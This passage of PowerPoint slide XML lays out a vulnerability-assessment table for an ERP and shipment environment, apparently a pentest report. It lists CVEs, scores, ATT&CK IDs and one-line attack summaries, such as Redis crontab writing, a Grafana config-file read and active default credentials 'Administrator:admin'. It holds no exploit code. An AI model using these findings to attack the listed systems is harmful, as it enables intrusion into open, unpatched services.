          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2022-22965</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="TextBox 53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="3794760"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>9.8</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="TextBox 54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2258568" y="3794760"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>97.2%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="TextBox 55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2852928" y="3794760"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>YES</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="TextBox 56"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3355848" y="3794760"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OPEN</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="TextBox 57"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="3794760"/>
            <a:ext cx="1828800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1190 · T1059.007</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="TextBox 58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6236208" y="3794760"/>
            <a:ext cx="5943600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CRITICAL — Spring4Shell RCE bypasses all auth. Full backend code execution on ERP server.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="Rectangle 59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3995928"/>
            <a:ext cx="1197864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92608" y="4032504"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2022-0543</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="TextBox 61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="4032504"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>10.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="TextBox 62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2258568" y="4032504"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>89.1%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="TextBox 63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2852928" y="4032504"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>YES</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="TextBox 64"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3355848" y="4032504"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OPEN</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="TextBox 65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="4032504"/>
            <a:ext cx="1828800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1213 · T1059</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="TextBox 66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6236208" y="4032504"/>
            <a:ext cx="5943600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CRITICAL — Redis CONFIG SET allows writing crontab. Unauthenticated RCE in ~10 seconds.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="Rectangle 67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4233672"/>
            <a:ext cx="1197864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92608" y="4270248"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2021-43798</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="TextBox 69"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="4270248"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>7.5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="TextBox 70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2258568" y="4270248"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>63.4%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="TextBox 71"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2852928" y="4270248"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>YES</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="TextBox 72"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3355848" y="4270248"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OPEN</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="TextBox 73"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="4270248"/>
            <a:ext cx="1828800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1552</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="TextBox 74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6236208" y="4270248"/>
            <a:ext cx="5943600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HIGH — Grafana path traversal reads /etc/grafana/grafana.ini exposing admin password hash.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="Rectangle 75"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4471416"/>
            <a:ext cx="1197864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92608" y="4507992"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2023-46127</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="TextBox 77"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="4507992"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>8.8</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="TextBox 78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2258568" y="4507992"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>41.2%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="TextBox 79"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2852928" y="4507992"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NO</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="TextBox 80"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3355848" y="4507992"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OPEN</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="TextBox 81"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="4507992"/>
            <a:ext cx="1828800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1059.006</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="TextBox 82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6236208" y="4507992"/>
            <a:ext cx="5943600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HIGH — ERPNext stored XSS via item description. Default creds Administrator:admin still active.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="Rectangle 83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4709160"/>
            <a:ext cx="1197864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92608" y="4745736"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2023-25194</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="TextBox 85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="4745736"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>8.8</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="TextBox 86"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2258568" y="4745736"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>28.5%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="TextBox 87"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2852928" y="4745736"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NO</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="TextBox 88"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3355848" y="4745736"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OPEN</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="TextBox 89"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="4745736"/>
            <a:ext cx="1828800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1203 · T1048</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="91" name="TextBox 90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6236208" y="4745736"/>
            <a:ext cx="5943600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HIGH — Kafka JMX JNDI RCE + no SASL means all 6 shipment topics readable without auth.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="Rectangle 91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4946904"/>
